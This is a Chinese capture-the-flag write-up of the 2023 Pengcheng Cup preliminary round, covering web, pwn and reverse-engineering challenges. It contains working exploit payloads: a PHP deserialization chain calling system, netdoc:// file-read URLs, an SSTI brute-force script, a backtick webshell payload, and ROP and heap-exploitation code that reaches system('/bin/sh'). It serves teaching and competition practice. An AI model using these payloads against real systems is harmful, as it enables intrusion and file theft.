---
title: 2023 鹏程杯初赛 writeup
contest: 鹏程杯
year: 2023
difficulty: hard
vuln_type: [web_unknown, deserialize, rce, ssti, rop, ret2libc, heap_exploit, reverse]
tags: [PHP反序列化POP链, nonono正则, Spring Boot Swagger, file:///netdoc协议文件包含, Tera Rust SSTI, get_env matching, glob爆破, 数组绕strlen, ORW沙盒bypass, babyheap off_by_null, unlink重叠, FSOP, environ栈泄露, XOR0x23 PE还原, RC4密钥th3k3y]
attack_chain: PHP 反序列化链 H→welcome→A→C→E→K→R→Hacker.system(cat /flag) → postman /proxy/url?url=netdoc:///flag%23.html → Tera raw data `{% set t="galf"|reverse %}{% set f=get_env(name=t,default="123") %}{% if f is matching('canshu.*') %}aaaaa{% endif %}` 双 ^fla.. 爆破 → glob:// 脚本逐字符爆破 backdoor_xxx → username=admin&title[]=2.php&data[]=<?=`tac /f*` 数组绕 strlen → PWN silent 栈溢出 + magic gadget 改 _IO_2_1_stdout_ 指向 syscall;ret → babyheap off_by_null + unlink 重叠 + environ 栈泄露 + ROP system(/bin/sh) → bad_pe 全文件异或 0x23 → RC4 密钥 th3k3y! 解密
key_payload: netdoc:///flag%23.html ; username=admin&title[]=2.php&data[]=<?=`tac%20/f*` ; payload = b"A"*0x48 + p64(csu_1) + ... + p64(leave_ret) ; RC4('th3k3y!') ^ [0xBD, 0xF0, 0x4C, ...]
one_liner: PHP 反序列化 + Spring Boot Swagger + Tera SSTI + 数组绕 strlen + ORW + babyheap off_by_null + XOR0x23 PE。
lesson: Tera Rust SSTI 走 get_env 旁路 + 数组绕 strlen 是 web 反复出现的 trick。
quality: high
---
# 2023 鹏程杯初赛 writeup

**WEB**

**一、Web-web1（PHP 反序列化 POP 链）**

7 个 class，POP 链：H→welcome→A.__toString→C.__get→E.__invoke→K.__call→R.welcome→Hacker.__toString→`call_user_func('system', 'cat /flag')`。

`nonono` 函数对 POST 的 `pop` 参数做 `/system|exec|passthru|.../i` 过滤，但因为链中只用 Hacker 类的 `__toString` 触发 system，不影响。

**二、Web-HTTP（Spring Boot Swagger 文件包含）**

```bash
GET /swagger-ui/index.html
# 找到 /proxy/url?url=...
GET /proxy/url?url=url:netdoc:///flag%23.html   # 截断
GET /proxy/url?url=url:file:///flag%23.html
```

Spring Boot 默认带 Springfox 暴露 OpenAPI 文档 + Jackson URL 拉取 → netdoc 协议文件读。

**三、Web-Tera（Rust SSTI）**

```python
str = string.hexdigits + '-+,'
zhi = '^fla..'
def fuck(p):
    data = """{% set t="galf"|reverse %}{% set f=get_env(name=t,default="123") %}
    {% if f is matching('canshu.*') %}aaaaa{% endif %}""".replace('canshu', p)
    r = requests.post(url, data=data)
    return 'aaaaa' in r.text
while True:
    for i in str:
        if fuck(zhi + i): zhi += i; break
        if i == '+': break
```

Tera 是 Rust 模板引擎，`get_env(name=...)` 取环境变量，"galf" 反转得 "flag" → 在环境变量里找 flag 值。逐字符模糊匹配。

**四、Web-web2（glob 爆破 + 数组绕 strlen）**

```python
path = '/var/www/html/backdoor_'
for i in range(100):
    for s in 'abcdefghijklmnopqrstuvwxyz0123456789.':
        if 'yesyesyes' in requests.post(url, data={'filename': f'glob://{path + s}*'}).text:
            path += s; break
```

glob:// 协议爆破 PHP 后门文件 → 拿到后门源码（data 限制 ≤5、title 限制 ≤3、文件大小 ≤10）：

```
backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=admin&title[]=2.php&data[]=<?=`tac%20/f*`;
```

`title[]` / `data[]` 传数组绕过 `strlen()` 类型校验。

**PWN**

**五、Pwn-silent（ORW + magic gadget 改 stdout）**

```python
libc = ELF('./libc-2.27.so')
op = 0xffffffffffffffff & (0xd2625 - libc.sym['_IO_2_1_stdout_'])
syscall = p64(csu_1) + p64(op) + p64(stdout+0x3d) + p64(1) + p64(0) + p64(0) + p64(0) + p64(magic)
payload = b'A'*0x48 + p64(csu_1) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss-8) + p64(0x200) + p64(csu_2)
payload += p64(bss-8)*3 + p64(0)*4 + p64(leave_ret)
```

栈溢出 0x48 字节后接 csu_1 → 调 read 写 bss → 再 csu_2 跳 magic gadget → 把 `_IO_2_1_stdout_` 改成 syscall;ret 附近 → 后续 read 直接当 syscall 调 `open('/flag')` + `read(fd, bss+0x400, 0x40)` + `write(1, bss+0x400, 0x40)`。

**六、Pwn-Auto_Coffee_machine + Pwn-babyheap（off_by_null + unlink）**

```python
add(0x408, p64(heap_base + 0x7b0) + b'A'*0x3ff + b'\n')  # 伪造 fake_chunk
add(0x4f8, 'A'*0x4f8 + '\n')
add(0x408, 'A'*0x407 + '\n')
edit(2, b'A'*0x400 + p64(0x410*2))           # 改 prev_size
edit(1, b'A'*0xe0 + p64(0) + p64(0x410*2+1) + p64(ptr-0x18) + p64(ptr-0x10) + p64(0) + p64(0))
dele(3)                                       # 触发 unlink
add(0x408, 'A'*0x407 + '\n')
show(2)                                       # 泄露 unsorted bin → libc
# FSOP 把 _IO_2_1_stdout_ 指针改到 environ → 泄露栈地址
edit(2, p64(libc.sym['_IO_2_1_stdout_']^(heap_base+0x2a0>>12))[:6])
add(0x408, p64(0xFBAD1800) + p64(0)*3 + p64(libc.sym['environ']) + p64(libc.sym['environ']+8) + b'\n')
stack = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
target = stack - 0x128 - 0x40
# FSOP 第二次把 stdout 改到 target → 写入 ROP
add(0x408, p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + b'\n')
```

off_by_null + unlink 重叠 + FSOP 链改 stdout 指针是 libc-2.27+ 经典套路。

**RE**

**七、bad_pe（XOR 0x23 还原 PE）**

整个文件 0x23 异或还原正常 PE → IDA 找 main → 动调取 35 字节密文 → RC4 密钥 `th3k3y!` 解密：

```python
key = b'th3k3y!'
plaintext = [0xBD, 0xF0, 0x4C, 0xD9, 0xD0, 0x29, ... 0x7E, 0x63]
for b in plaintext: print(chr(b ^ next(RC4(key))), end='')
```

flag = `flag{th3_p3fi15_1s_v3ry_nicccccc!}`
